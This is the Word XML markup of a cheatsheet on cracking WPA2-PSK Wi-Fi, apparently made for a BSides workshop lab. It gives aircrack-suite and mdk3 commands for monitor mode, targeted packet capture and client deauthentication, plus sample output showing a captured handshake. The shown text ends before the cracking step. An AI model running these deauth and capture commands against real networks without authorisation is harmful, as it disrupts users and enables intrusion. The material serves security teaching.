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6EFA5" w14:textId="215F2296" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1" w:rsidP="008274A1">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8274A1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Cheatsheet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> Cracking WPA2 PSK </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29245E51" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="00031C10" w:rsidRDefault="008274A1" w:rsidP="008274A1">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>First, put the card in monitor mode :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734306F0" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>root@bt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">:~# </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airmon-</w:t>
      </w:r>
      <w:r w:rsidR="00D81026" w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>zc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6E2A42" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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p>
    <w:p w14:paraId="657CE5EC" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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p>
    <w:p w14:paraId="038D7012" w14:textId="20390CDD" w:rsidR="008274A1" w:rsidRPr="001565B0" w:rsidRDefault="008274A1"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>root@bt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">:~# </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airmon-</w:t>
      </w:r>
      <w:r w:rsidR="00D81026" w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>zc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start wlan0</w:t>
      </w:r>
      <w:r w:rsidR="00754F21" w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6 </w:t>
      </w:r>
      <w:r w:rsidR="00754F21" w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0DF"/>
      </w:r>
      <w:r w:rsidR="00754F21" w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>channel 6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64111424" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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p>
    <w:p w14:paraId="09AE8C13" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="00031C10" w:rsidRDefault="008274A1" w:rsidP="008274A1">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Let’s find a wireless network that uses WPA2 / PSK :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08405C9E" w14:textId="31E3DF67" w:rsidR="00E415FB" w:rsidRPr="001565B0" w:rsidRDefault="008274A1" w:rsidP="00E415F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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>root@bt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">:~# </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D81026" w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
      <w:r w:rsidR="00CE7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E415FB" w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>essid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E415FB" w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-regex BSIDESDC*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="282DD737" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="001565B0" w:rsidRDefault="008274A1"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70A6F2EB" w14:textId="59BEA257" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1" w:rsidP="000E710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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC227B8" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="00031C10" w:rsidRDefault="008274A1" w:rsidP="008274A1">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Stop </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and run it again, writing all packets to disk :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667A8B8B" w14:textId="77777777" w:rsidR="004A762F" w:rsidRPr="001565B0" w:rsidRDefault="008274A1"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D81026" w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> --channel 10 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:19:5B:52:AD:F7 -w /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/wpa2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06483B33" w14:textId="77777777" w:rsidR="004A762F" w:rsidRDefault="004A762F" w:rsidP="008274A1">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C13D5FE" w14:textId="77777777" w:rsidR="0040213D" w:rsidRDefault="0040213D" w:rsidP="008274A1">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7562324A" w14:textId="77777777" w:rsidR="003C3618" w:rsidRPr="00E40A9F" w:rsidRDefault="003C3618" w:rsidP="008274A1">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E40A9F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DEAUTH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5330461B" w14:textId="77777777" w:rsidR="008274A1" w:rsidRDefault="008274A1" w:rsidP="008274A1">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">We need the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the AP (-a) and the mac of a connected client (-c)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFE5225" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1" w:rsidP="008274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274A1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">         Access Point</w:t>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
        <w:t>Client</w:t>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="FF0000"/>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0A25B91" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="001565B0" w:rsidRDefault="008274A1"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -0 1 -a 00:19:5B:52:AD:F7 -c 00:1C:BF:90:5B:A3 </w:t>
      </w:r>
      <w:r w:rsidR="0040213D" w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F9F828D" w14:textId="77777777" w:rsidR="0040213D" w:rsidRPr="001565B0" w:rsidRDefault="0040213D"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FDCA484" w14:textId="7CE9E347" w:rsidR="00310BF5" w:rsidRPr="001565B0" w:rsidRDefault="00310BF5"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>mdk3 wlan0mon d –c 11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23AC9960" w14:textId="77777777" w:rsidR="00310BF5" w:rsidRPr="008274A1" w:rsidRDefault="00310BF5"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20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26ACB40A" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1" w:rsidP="008274A1">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">As a result, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> should indicate “WPA Handshake:” in the upper right corner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A839EFA" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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CH 10 ][ Elapsed: 2 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>mins</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> ][ 2009-02-21 13:04 ][ </w:t>
      </w:r>
      <w:r w:rsidRPr="00C01409">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>WPA handshake: 00:19:5B:52:AD:F7</w:t>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                                         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3676BFA7" w14:textId="77777777" w:rsidR="008274A1" w:rsidRPr="008274A1" w:rsidRDefault="008274A1"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w:t>
      </w:r>
    </w:p>
